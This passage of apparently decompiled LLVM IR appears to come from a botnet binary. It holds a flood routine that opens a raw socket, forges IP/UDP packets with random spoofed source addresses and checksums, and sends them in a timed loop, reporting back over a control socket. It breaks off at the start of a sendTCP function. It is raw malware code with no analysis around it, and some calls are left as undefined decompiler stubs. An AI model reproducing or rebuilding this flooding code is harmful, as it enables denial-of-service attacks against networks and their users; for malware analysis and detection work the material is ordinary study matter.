  %v2_804d0dd = call i32 @usleep(i64 %v3_804d0d4)
  store i32 %v2_804d0dd, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d05e.outer

dec_label_pc_804d0ee:                             ; preds = %dec_label_pc_804d0c6
  %v4_804d0ee = add i32 %stack_var_-88.0.ph, 1
  br label %dec_label_pc_804d05e.outer

dec_label_pc_804d0f6:                             ; preds = %dec_label_pc_804cf9d
  store i32 %v13_804cf4e, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-140, align 4
  %v4_804d112 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804d112, i32* %eax.global-to-local, align 4
  %v4_804d11a = icmp eq i32 %v4_804d112, 0
  %v1_804d11e = icmp eq i1 %v4_804d11a, false
  br i1 %v1_804d11e, label %dec_label_pc_804d13a, label %dec_label_pc_804d120

dec_label_pc_804d120:                             ; preds = %dec_label_pc_804d0f6
  %v0_804d120 = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804d120, i32* %eax.global-to-local, align 4
  store i32 %v0_804d120, i32* %stack_var_-140, align 4
  %v3_804d130 = call i32 @sockprintf(i32 %v0_804d120, i32 ptrtoint ([27 x i8]* @global_var_8058170.220 to i32))
  store i32 %v3_804d130, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d43b

dec_label_pc_804d13a:                             ; preds = %dec_label_pc_804d0f6
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804d149 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v4_804d112, i32* %eax.global-to-local, align 4
  store i32 %v4_804d112, i32* %stack_var_-140, align 4
  %v6_804d166 = call i32 @__GI_setsockopt(i32 %v4_804d112, i32 0, i32 3, i32 %v2_804d149, i32 4)
  store i32 %v6_804d166, i32* %eax.global-to-local, align 4
  %v2_804d16b = icmp slt i32 %v6_804d166, 0
  %v1_804d16d = icmp eq i1 %v2_804d16b, false
  br i1 %v1_804d16d, label %dec_label_pc_804d1bc.preheader, label %dec_label_pc_804d16f

dec_label_pc_804d1bc.preheader:                   ; preds = %dec_label_pc_804d13a
  br label %dec_label_pc_804d192

dec_label_pc_804d16f:                             ; preds = %dec_label_pc_804d13a
  %v0_804d16f = load i32, i32* @global_var_8062580.20, align 128
  store i32 %v0_804d16f, i32* %eax.global-to-local, align 4
  store i32 %v0_804d16f, i32* %stack_var_-140, align 4
  %v3_804d17f = call i32 @sockprintf(i32 %v0_804d16f, i32 ptrtoint ([33 x i8]* @global_var_805818c.221 to i32))
  store i32 %v3_804d17f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d43b

dec_label_pc_804d192:                             ; preds = %dec_label_pc_804d1bc.preheader, %dec_label_pc_804d192
  %v4_804d1bc76 = phi i32 [ 49, %dec_label_pc_804d1bc.preheader ], [ %v4_804d1bc, %dec_label_pc_804d192 ]
  store i32 0, i32* %stack_var_-140, align 4
  %v2_804d199 = call i32 @__GI_time(i32* null)
  store i32 %v2_804d199, i32* %eax.global-to-local, align 4
  store i32 %v2_804d199, i32* @ebx, align 4
  %v0_804d1a0 = load i32, i32* %stack_var_-140, align 4
  %v1_804d1a0 = call i32 @rand_cmwc(i32 %v0_804d1a0)
  %v1_804d1a5 = load i32, i32* @ebx, align 4
  %v2_804d1a5 = xor i32 %v1_804d1a5, %v1_804d1a0
  store i32 %v2_804d1a5, i32* @eax, align 4
  store i32 %v2_804d1a5, i32* %stack_var_-140, align 4
  %v1_804d1aa = call i32 @srand(i32 %v2_804d1a5)
  store i32 %v1_804d1aa, i32* @eax, align 4
  %v0_804d1af = call i32 @random()
  store i32 %v0_804d1af, i32* %eax.global-to-local, align 4
  store i32 %v0_804d1af, i32* %stack_var_-140, align 4
  %v1_804d1b7 = call i32 @init_rand(i32 %v0_804d1af)
  store i32 %v1_804d1b7, i32* %eax.global-to-local, align 4
  %v4_804d1bc = add nsw i32 %v4_804d1bc76, -1
  %v13_804d1bf = icmp eq i32 %v4_804d1bc76, 0
  %v1_804d1c3 = icmp eq i1 %v13_804d1bf, false
  br i1 %v1_804d1c3, label %dec_label_pc_804d192, label %dec_label_pc_804d1c5

dec_label_pc_804d1c5:                             ; preds = %dec_label_pc_804d192
  %v4_804d1c5 = icmp eq i32 %arg4, 0
  %v1_804d1c9 = icmp eq i1 %v4_804d1c5, false
  br i1 %v1_804d1c9, label %dec_label_pc_804d1d4, label %dec_label_pc_804d1ea

dec_label_pc_804d1d4:                             ; preds = %dec_label_pc_804d1c5
  %v5_804d1db = sub i32 32, %arg4
  %v2_804d1e3 = urem i32 %v5_804d1db, 32
  %v4_804d1e3 = icmp eq i32 %v2_804d1e3, 0
  br i1 %v4_804d1e3, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_804d1d4
  %v5_804d1e3 = shl i32 1, %v2_804d1e3
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_804d1d4, %bb
  %v0_804d1e5 = phi i32 [ %v5_804d1e3, %bb ], [ 1, %dec_label_pc_804d1d4 ]
  %v1_804d1e5 = sub i32 0, %v0_804d1e5
  store i32 %v1_804d1e5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d1ea

dec_label_pc_804d1ea:                             ; preds = %dec_label_pc_804d1c5, %bb72
  %storemerge6 = phi i32 [ %v1_804d1e5, %bb72 ], [ 0, %dec_label_pc_804d1c5 ]
  %v1_804d1ed = add i32 %arg5, 28
  %v1_804d1f9 = add i32 %arg5, 58
  %v2_804d1fc = and i32 %v1_804d1f9, -16
  %v0_804d202 = load i32, i32* @esp, align 4
  %v2_804d202 = sub i32 %v0_804d202, %v2_804d1fc
  %v1_804d20e = add i32 %v2_804d202, 39
  %v2_804d211 = and i32 %v1_804d20e, -16
  store i32 %v2_804d211, i32* %edx.global-to-local, align 4
  %v1_804d229 = add i32 %v2_804d211, 20
  %v5_804d22c = inttoptr i32 %v1_804d229 to i16*
  %v1_804d232 = add i32 %arg5, 8
  store i32 %v1_804d232, i32* @ebx, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804d23a = inttoptr i32 %v2_804d202 to i32*
  store i32 %storemerge6, i32* %v2_804d23a, align 4
  %v2_804d23d = call i32 @GetRandomIP(i32 %v1_804d1ed, i32 %v2_804d211)
  store i32 %v2_804d23d, i32* %eax.global-to-local, align 4
  %v1_804d242 = load i32, i32* @esp, align 4
  %v2_804d242 = inttoptr i32 %v1_804d242 to i32*
  store i32 %v2_804d23d, i32* %v2_804d242, align 4
  %v0_804d245 = call i32 @htonl()
  %v3_804d24a = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804d24a, i32* %edx.global-to-local, align 4
  %v0_804d24d = load i32, i32* @ebx, align 4
  %v1_804d24d = load i32, i32* @esp, align 4
  %v2_804d24d = add i32 %v1_804d24d, 16
  %v3_804d24d = inttoptr i32 %v2_804d24d to i32*
  store i32 %v0_804d24d, i32* %v3_804d24d, align 4
  %v0_804d251 = load i32, i32* @esp, align 4
  %v1_804d251 = add i32 %v0_804d251, 12
  %v2_804d251 = inttoptr i32 %v1_804d251 to i32*
  store i32 17, i32* %v2_804d251, align 4
  %v1_804d259 = load i32, i32* @esp, align 4
  %v2_804d259 = add i32 %v1_804d259, 8
  %v3_804d259 = inttoptr i32 %v2_804d259 to i32*
  store i32 %v0_804d245, i32* %v3_804d259, align 4
  %v0_804d25d = load i32, i32* %edx.global-to-local, align 4
  %v1_804d25d = load i32, i32* @esp, align 4
  %v2_804d25d = add i32 %v1_804d25d, 4
  %v3_804d25d = inttoptr i32 %v2_804d25d to i32*
  store i32 %v0_804d25d, i32* %v3_804d25d, align 4
  store i32 %v2_804d211, i32* %eax.global-to-local, align 4
  %v1_804d264 = load i32, i32* @esp, align 4
  %v2_804d264 = inttoptr i32 %v1_804d264 to i32*
  store i32 %v2_804d211, i32* %v2_804d264, align 4
  %v0_804d267 = call i32 @makeIPPacket()
  %v1_804d275 = urem i32 %v1_804d232, 65536
  store i32 %v1_804d275, i32* %eax.global-to-local, align 4
  %v1_804d278 = load i32, i32* @esp, align 4
  %v2_804d278 = inttoptr i32 %v1_804d278 to i32*
  store i32 %v1_804d275, i32* %v2_804d278, align 4
  %v2_804d27b = trunc i32 %v1_804d229 to i16
  %v3_804d27b = call i32 @htons(i16 %v2_804d27b)
  %v1_804d280 = urem i32 %v3_804d27b, 65536
  store i32 %v1_804d280, i32* %edx.global-to-local, align 4
  store i32 %v1_804d229, i32* %eax.global-to-local, align 4
  %v1_804d286 = trunc i32 %v3_804d27b to i16
  %v3_804d286 = add i32 %v2_804d211, 24
  %v4_804d286 = inttoptr i32 %v3_804d286 to i16*
  store i16 %v1_804d286, i16* %v4_804d286, align 8
  %v2_804d28a = call i32 @rand_cmwc(i32 %v1_804d229)
  %v1_804d28f = urem i32 %v2_804d28a, 65536
  store i32 %v1_804d28f, i32* %edx.global-to-local, align 4
  store i32 %v1_804d229, i32* %eax.global-to-local, align 4
  %v1_804d295 = trunc i32 %v2_804d28a to i16
  store i16 %v1_804d295, i16* %v5_804d22c, align 4
  br i1 %v1_804cf5b, label %dec_label_pc_804d2ab, label %dec_label_pc_804d29e

dec_label_pc_804d29e:                             ; preds = %dec_label_pc_804d1ea
  %v2_804d29e = call i32 @rand_cmwc(i32 %v1_804d229)
  %.pre = urem i32 %arg2, 65536
  br label %dec_label_pc_804d2bf

dec_label_pc_804d2ab:                             ; preds = %dec_label_pc_804d1ea
  %v1_804d2ae = urem i32 %arg2, 65536
  store i32 %v1_804d2ae, i32* %eax.global-to-local, align 4
  %v1_804d2b1 = load i32, i32* @esp, align 4
  %v2_804d2b1 = inttoptr i32 %v1_804d2b1 to i32*
  store i32 %v1_804d2ae, i32* %v2_804d2b1, align 4
  %v3_804d2b4 = call i32 @htons(i16 %tmp32)
  br label %dec_label_pc_804d2bf

dec_label_pc_804d2bf:                             ; preds = %dec_label_pc_804d29e, %dec_label_pc_804d2ab
  %v1_804d37f.pre-phi = phi i32 [ %.pre, %dec_label_pc_804d29e ], [ %v1_804d2ae, %dec_label_pc_804d2ab ]
  %storemerge8.in = phi i32 [ %v2_804d29e, %dec_label_pc_804d29e ], [ %v3_804d2b4, %dec_label_pc_804d2ab ]
  %storemerge5 = trunc i32 %storemerge8.in to i16
  %sext9 = mul i32 %storemerge8.in, 65536
  %v4_804d2c2 = sdiv i32 %sext9, 65536
  %v3_804d2c5 = add i32 %v2_804d211, 22
  %v4_804d2c5 = inttoptr i32 %v3_804d2c5 to i16*
  store i16 %storemerge5, i16* %v4_804d2c5, align 2
  %v1_804d2cc = add i32 %v2_804d211, 26
  %v2_804d2cc = inttoptr i32 %v1_804d2cc to i16*
  store i16 0, i16* %v2_804d2cc, align 2
  %v1_804d2d5 = add i32 %v2_804d211, 28
  store i32 %v1_804d2d5, i32* %edx.global-to-local, align 4
  store i32 %arg5, i32* %eax.global-to-local, align 4
  %v1_804d2db = load i32, i32* @esp, align 4
  %v2_804d2db = add i32 %v1_804d2db, 4
  %v3_804d2db = inttoptr i32 %v2_804d2db to i32*
  store i32 %arg5, i32* %v3_804d2db, align 4
  %v0_804d2df = load i32, i32* %edx.global-to-local, align 4
  %v1_804d2df = load i32, i32* @esp, align 4
  %v2_804d2df = inttoptr i32 %v1_804d2df to i32*
  store i32 %v0_804d2df, i32* %v2_804d2df, align 4
  %v3_804d2e2 = sext i16 %tmp to i32
  %v4_804d2e2 = inttoptr i32 %v4_804d2c2 to i8*
  %v5_804d2e2 = call i32 @makeRandomStr(i8* %v4_804d2e2, i32 %v3_804d2e2)
  store i32 %v2_804d211, i32* %eax.global-to-local, align 4
  %v1_804d2ea = or i32 %v2_804d211, 2
  %v2_804d2ea = inttoptr i32 %v1_804d2ea to i16*
  %v3_804d2ea = load i16, i16* %v2_804d2ea, align 2
  %v4_804d2ea = zext i16 %v3_804d2ea to i32
  store i32 %v4_804d2ea, i32* %edx.global-to-local, align 4
  store i32 %v2_804d211, i32* %eax.global-to-local, align 4
  %v1_804d2f3 = load i32, i32* @esp, align 4
  %v2_804d2f3 = add i32 %v1_804d2f3, 4
  %v3_804d2f3 = inttoptr i32 %v2_804d2f3 to i32*
  store i32 %v4_804d2ea, i32* %v3_804d2f3, align 4
  %v0_804d2f7 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d2f7 = load i32, i32* @esp, align 4
  %v2_804d2f7 = inttoptr i32 %v1_804d2f7 to i32*
  store i32 %v0_804d2f7, i32* %v2_804d2f7, align 4
  %v4_804d2fa = inttoptr i32 %v4_804d2c2 to i16*
  %v5_804d2fa = call i32 @csum(i16* %v4_804d2fa, i32 %v3_804d2e2)
  %v1_804d2ff = urem i32 %v5_804d2fa, 65536
  store i32 %v1_804d2ff, i32* %edx.global-to-local, align 4
  store i32 %v2_804d211, i32* %eax.global-to-local, align 4
  %v1_804d305 = trunc i32 %v5_804d2fa to i16
  %v3_804d305 = or i32 %v2_804d211, 10
  %v4_804d305 = inttoptr i32 %v3_804d305 to i16*
  store i16 %v1_804d305, i16* %v4_804d305, align 2
  %v0_804d309 = load i32, i32* @esp, align 4
  %v1_804d309 = inttoptr i32 %v0_804d309 to i32*
  store i32 0, i32* %v1_804d309, align 4
  %v2_804d310 = inttoptr i32 %v4_804d2c2 to i32*
  %v3_804d310 = call i32 @__GI_time(i32* %v2_804d310)
  %v5_804d315 = add i32 %v3_804d310, %arg3
  store i32 %v5_804d315, i32* %eax.global-to-local, align 4
  %v3_804d3a5 = or i32 %v2_804d211, 4
  %v4_804d3a5 = inttoptr i32 %v3_804d3a5 to i16*
  %v2_804d3c1 = or i32 %v2_804d211, 12
  %v3_804d3c1 = inttoptr i32 %v2_804d3c1 to i32*
  %sext12 = mul i64 %arg8, 4294967296
  %v2_804d419 = sdiv i64 %sext12, 4294967296
  %v3_804d419 = mul nsw i64 %v2_804d419, 1000
  %v4_804d419 = trunc i64 %v3_804d419 to i32
  br label %dec_label_pc_804d32b.outer

dec_label_pc_804d32b.outer:                       ; preds = %dec_label_pc_804d416, %dec_label_pc_804d433, %dec_label_pc_804d2bf
  %stack_var_-84.0.ph = phi i32 [ 0, %dec_label_pc_804d2bf ], [ %v4_804d40b, %dec_label_pc_804d433 ], [ %v4_804d40b, %dec_label_pc_804d416 ]
  %stack_var_-80.0.ph = phi i32 [ 0, %dec_label_pc_804d2bf ], [ %v4_804d433, %dec_label_pc_804d433 ], [ 0, %dec_label_pc_804d416 ]
  %stack_var_-104.0.ph = phi i16 [ %tmp, %dec_label_pc_804d2bf ], [ %storemerge, %dec_label_pc_804d433 ], [ %storemerge, %dec_label_pc_804d416 ]
  br label %dec_label_pc_804d32b

dec_label_pc_804d32b:                             ; preds = %dec_label_pc_804d32b.outer, %dec_label_pc_804d3ee
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804d3ee ], [ %stack_var_-84.0.ph, %dec_label_pc_804d32b.outer ]
  %stack_var_-104.0 = phi i16 [ %storemerge, %dec_label_pc_804d3ee ], [ %stack_var_-104.0.ph, %dec_label_pc_804d32b.outer ]
  store i32 %v2_804d211, i32* %edx.global-to-local, align 4
  %v0_804d331 = load i32, i32* @esp, align 4
  %v1_804d331 = add i32 %v0_804d331, 20
  %v2_804d331 = inttoptr i32 %v1_804d331 to i32*
  store i32 16, i32* %v2_804d331, align 4
  %v1_804d339 = load i32, i32* @esp, align 4
  %v2_804d339 = add i32 %v1_804d339, 16
  %v3_804d339 = inttoptr i32 %v2_804d339 to i32*
  store i32 %v2_804cf80, i32* %v3_804d339, align 4
  %v0_804d33d = load i32, i32* @esp, align 4
  %v1_804d33d = add i32 %v0_804d33d, 12
  %v2_804d33d = inttoptr i32 %v1_804d33d to i32*
  store i32 0, i32* %v2_804d33d, align 4
  %v1_804d348 = load i32, i32* @esp, align 4
  %v2_804d348 = add i32 %v1_804d348, 8
  %v3_804d348 = inttoptr i32 %v2_804d348 to i32*
  store i32 %v1_804d1ed, i32* %v3_804d348, align 4
  %v0_804d34c = load i32, i32* %edx.global-to-local, align 4
  %v1_804d34c = load i32, i32* @esp, align 4
  %v2_804d34c = add i32 %v1_804d34c, 4
  %v3_804d34c = inttoptr i32 %v2_804d34c to i32*
  store i32 %v0_804d34c, i32* %v3_804d34c, align 4
  store i32 %v4_804d112, i32* %eax.global-to-local, align 4
  %v1_804d353 = load i32, i32* @esp, align 4
  %v2_804d353 = inttoptr i32 %v1_804d353 to i32*
  store i32 %v4_804d112, i32* %v2_804d353, align 4
  %v6_804d356 = call i32 @__libc_sendto(i32 %stack_var_-80.0.ph, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_804d356, i32* %eax.global-to-local, align 4
  %v1_804d35b = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  %v1_804d360 = urem i32 %v1_804d35b, 65536
  store i32 %v1_804d360, i32* %edx.global-to-local, align 4
  store i32 %v1_804d229, i32* %eax.global-to-local, align 4
  %v1_804d366 = trunc i32 %v1_804d35b to i16
  store i16 %v1_804d366, i16* %v5_804d22c, align 4
  br i1 %v1_804cf5b, label %dec_label_pc_804d37c, label %dec_label_pc_804d36f

dec_label_pc_804d36f:                             ; preds = %dec_label_pc_804d32b
  %v1_804d36f = call i32 @rand_cmwc(i32 %stack_var_-80.0.ph)
  br label %dec_label_pc_804d390

dec_label_pc_804d37c:                             ; preds = %dec_label_pc_804d32b
  store i32 %v1_804d37f.pre-phi, i32* %eax.global-to-local, align 4
  %v1_804d382 = load i32, i32* @esp, align 4
  %v2_804d382 = inttoptr i32 %v1_804d382 to i32*
  store i32 %v1_804d37f.pre-phi, i32* %v2_804d382, align 4
  %v3_804d385 = call i32 @htons(i16 %stack_var_-104.0)
  br label %dec_label_pc_804d390

dec_label_pc_804d390:                             ; preds = %dec_label_pc_804d36f, %dec_label_pc_804d37c
  %storemerge10.in = phi i32 [ %v1_804d36f, %dec_label_pc_804d36f ], [ %v3_804d385, %dec_label_pc_804d37c ]
  %storemerge = trunc i32 %storemerge10.in to i16
  store i32 %v1_804d229, i32* %eax.global-to-local, align 4
  %sext11 = mul i32 %storemerge10.in, 65536
  %v4_804d393 = sdiv i32 %sext11, 65536
  store i32 %v4_804d393, i32* %edx.global-to-local, align 4
  store i16 %storemerge, i16* %v4_804d2c5, align 2
  %v2_804d39a = call i32 @rand_cmwc(i32 %v4_804d393)
  %v1_804d39f = urem i32 %v2_804d39a, 65536
  store i32 %v1_804d39f, i32* %edx.global-to-local, align 4
  %v1_804d3a5 = trunc i32 %v2_804d39a to i16
  store i16 %v1_804d3a5, i16* %v4_804d3a5, align 4
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v1_804d3ac = load i32, i32* @esp, align 4
  %v2_804d3ac = inttoptr i32 %v1_804d3ac to i32*
  store i32 %storemerge6, i32* %v2_804d3ac, align 4
  %v3_804d3af = call i32 @GetRandomIP(i32 %v4_804d393, i32 %v13_804cf4e)
  store i32 %v3_804d3af, i32* %eax.global-to-local, align 4
  %v1_804d3b4 = load i32, i32* @esp, align 4
  %v2_804d3b4 = inttoptr i32 %v1_804d3b4 to i32*
  store i32 %v3_804d3af, i32* %v2_804d3b4, align 4
  %v0_804d3b7 = call i32 @htonl()
  store i32 %v0_804d3b7, i32* %edx.global-to-local, align 4
  store i32 %v0_804d3b7, i32* %v3_804d3c1, align 4
  store i32 %v2_804d211, i32* %eax.global-to-local, align 4
  %v3_804d3c7 = load i16, i16* %v2_804d2ea, align 2
  %v4_804d3c7 = zext i16 %v3_804d3c7 to i32
  store i32 %v4_804d3c7, i32* %edx.global-to-local, align 4
  store i32 %v2_804d211, i32* %eax.global-to-local, align 4
  %v1_804d3d0 = load i32, i32* @esp, align 4
  %v2_804d3d0 = add i32 %v1_804d3d0, 4
  %v3_804d3d0 = inttoptr i32 %v2_804d3d0 to i32*
  store i32 %v4_804d3c7, i32* %v3_804d3d0, align 4
  %v0_804d3d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804d3d4 = load i32, i32* @esp, align 4
  %v2_804d3d4 = inttoptr i32 %v1_804d3d4 to i32*
  store i32 %v0_804d3d4, i32* %v2_804d3d4, align 4
  %v3_804d3d7 = inttoptr i32 %v4_804d393 to i16*
  %v4_804d3d7 = call i32 @csum(i16* %v3_804d3d7, i32 %v13_804cf4e)
  %v1_804d3dc = urem i32 %v4_804d3d7, 65536
  store i32 %v1_804d3dc, i32* %edx.global-to-local, align 4
  %v1_804d3e2 = trunc i32 %v4_804d3d7 to i16
  store i16 %v1_804d3e2, i16* %v4_804d305, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804d3e9 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804d3ec = icmp eq i1 %v15_804d3e9, false
  br i1 %v1_804d3ec, label %dec_label_pc_804d40b, label %dec_label_pc_804d3ee

dec_label_pc_804d3ee:                             ; preds = %dec_label_pc_804d390
  %v0_804d3ee = load i32, i32* @esp, align 4
  %v1_804d3ee = inttoptr i32 %v0_804d3ee to i32*
  store i32 0, i32* %v1_804d3ee, align 4
  %v2_804d3f5 = inttoptr i32 %v4_804d393 to i32*
  %v3_804d3f5 = call i32 @__GI_time(i32* %v2_804d3f5)
  store i32 %v3_804d3f5, i32* %eax.global-to-local, align 4
  %v8_804d3fd = icmp sgt i32 %v3_804d3f5, %v5_804d315
  br i1 %v8_804d3fd, label %dec_label_pc_804d43b, label %dec_label_pc_804d32b

dec_label_pc_804d40b:                             ; preds = %dec_label_pc_804d390
  %v4_804d40b = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804d411 = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804d414 = icmp eq i1 %v15_804d411, false
  br i1 %v1_804d414, label %dec_label_pc_804d433, label %dec_label_pc_804d416

dec_label_pc_804d416:                             ; preds = %dec_label_pc_804d40b
  store i32 %v4_804d419, i32* %eax.global-to-local, align 4
  %v1_804d41f = load i32, i32* @esp, align 4
  %v2_804d41f = inttoptr i32 %v1_804d41f to i32*
  store i32 %v4_804d419, i32* %v2_804d41f, align 4
  %v1_804d422 = sext i32 %v4_804d40b to i64
  %v2_804d422 = call i32 @usleep(i64 %v1_804d422)
  store i32 %v2_804d422, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804d32b.outer

dec_label_pc_804d433:                             ; preds = %dec_label_pc_804d40b
  %v4_804d433 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_804d32b.outer

dec_label_pc_804d43b:                             ; preds = %dec_label_pc_804d3ee, %dec_label_pc_804d16f, %dec_label_pc_804d120
  %v0_804d44428 = phi i32 [ %v3_804d17f, %dec_label_pc_804d16f ], [ %v3_804d130, %dec_label_pc_804d120 ], [ %v3_804d3f5, %dec_label_pc_804d3ee ]
  br label %dec_label_pc_804d43e

dec_label_pc_804d43e:                             ; preds = %dec_label_pc_804d0a8, %dec_label_pc_804cfff, %dec_label_pc_804cf80, %dec_label_pc_804cfe5, %dec_label_pc_804d43b
  %v0_804d444 = phi i32 [ 0, %dec_label_pc_804cfff ], [ %v4_804cf90, %dec_label_pc_804cf80 ], [ %v3_804cff5, %dec_label_pc_804cfe5 ], [ %v0_804d44428, %dec_label_pc_804d43b ], [ %v2_804d0af, %dec_label_pc_804d0a8 ]
  store i32 %v0_804cf4d, i32* @ebx, align 4
  ret i32 %v0_804d444

; uselistorder directives
  uselistorder i32 %v4_804d40b, { 2, 1, 0 }
  uselistorder i32 %v4_804d3d7, { 1, 0 }
  uselistorder i32 %v2_804d39a, { 1, 0 }
  uselistorder i32 %v4_804d393, { 4, 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804d35b, { 1, 0 }
  uselistorder i32 %stack_var_-84.0, { 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 1, 2 }
  uselistorder i32 %v5_804d2fa, { 1, 0 }
  uselistorder i32 %v4_804d2c2, { 2, 1, 0 }
  uselistorder i32 %v1_804d37f.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804d2ae, { 2, 1, 0 }
  uselistorder i32 %v2_804d28a, { 1, 0 }
  uselistorder i32 %v3_804d27b, { 1, 0 }
  uselistorder i32 %v1_804d275, { 1, 0 }
  uselistorder i32 %v2_804d211, { 10, 9, 8, 18, 17, 16, 7, 6, 15, 5, 14, 13, 12, 11, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0, 3, 2 }
  uselistorder i32 %v2_804d1e3, { 1, 0 }
  uselistorder i32 %v4_804d112, { 1, 0, 4, 3, 2, 5, 6 }
  uselistorder i32 %v4_804d0c6, { 1, 0 }
  uselistorder i32 %stack_var_-92.0, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v1_804d006, { 1, 3, 2, 0, 5, 4, 6, 7 }
  uselistorder i32 %v1_804d002, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_804cfd7, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_804cf80, { 1, 0 }
  uselistorder i32 %v1_804cf6e, { 1, 0 }
  uselistorder i32* %stack_var_-140, { 2, 3, 1, 4, 5, 6, 7, 8, 9, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 2, 0, 1, 11, 3, 4, 5, 6, 10, 7, 8, 9, 12, 15, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 27, 26, 28, 29, 30, 31, 33, 32, 35, 34, 36, 37, 39, 38, 42, 40, 41, 44, 43, 47, 45, 46, 50, 48, 49, 52, 51, 53, 54, 55, 56, 58, 57, 59 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 4, 2, 3 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d43e, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804d390, { 1, 0 }
  uselistorder label %dec_label_pc_804d32b, { 1, 0 }
  uselistorder label %dec_label_pc_804d32b.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d2bf, { 1, 0 }
  uselistorder label %dec_label_pc_804d1ea, { 1, 0 }
  uselistorder label %bb72, { 1, 0 }
  uselistorder label %dec_label_pc_804d192, { 1, 0 }
  uselistorder label %dec_label_pc_804d0a8, { 1, 0 }
  uselistorder label %dec_label_pc_804d05e, { 1, 0 }
  uselistorder label %dec_label_pc_804d05e.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cf80, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp39 = call i16 @__decompiler_undefined_function_5()
  %tmp40 = call i32 @__decompiler_undefined_function_0()
  %tmp41 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-188 = alloca i32, align 4
  %v0_804d449 = load i32, i32* @esi, align 4
  %v0_804d44a = load i32, i32* @ebx, align 4
  %v15_804d44b = ptrtoint i32* %stack_var_-188 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804d462 = icmp eq i32 %arg2, 0
  %v1_804d466 = icmp eq i1 %v4_804d462, false
  br i1 %v1_804d466, label %dec_label_pc_804d476, label %dec_label_pc_804d468

dec_label_pc_804d468:                             ; preds = %entry
  %v1_804d468 = call i32 @rand_cmwc(i32 %v15_804d44b)
  br label %dec_label_pc_804d48b

dec_label_pc_804d476:                             ; preds = %entry
  %v1_804d479 = urem i32 %arg2, 65536
  store i32 %v1_804d479, i32* %eax.global-to-local, align 4
  store i32 %v1_804d479, i32* %stack_var_-188, align 4
  %v1_804d47f = trunc i32 %arg2 to i16
  %v2_804d47f = call i32 @htons(i16 %v1_804d47f)
  br label %dec_label_pc_804d48b

dec_label_pc_804d48b:                             ; preds = %dec_label_pc_804d468, %dec_label_pc_804d476
  %v2_804d48b = ptrtoint i32* %stack_var_-60 to i32
  %v5_804d48e = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804d48e, i1* %cf.global-to-local, align 1
  store i32 %arg1, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* %stack_var_-188, align 4
  %v4_804d49b = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804d49b, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804d4a0 = icmp eq i32 %v4_804d49b, 0
  br i1 %v1_804d4a0, label %dec_label_pc_804d4a9, label %dec_label_pc_804da02

dec_label_pc_804d4a9:                             ; preds = %dec_label_pc_804d48b
  %v5_804d4ac = icmp ugt i32* %stack_var_-60, inttoptr (i32 -9 to i32*)
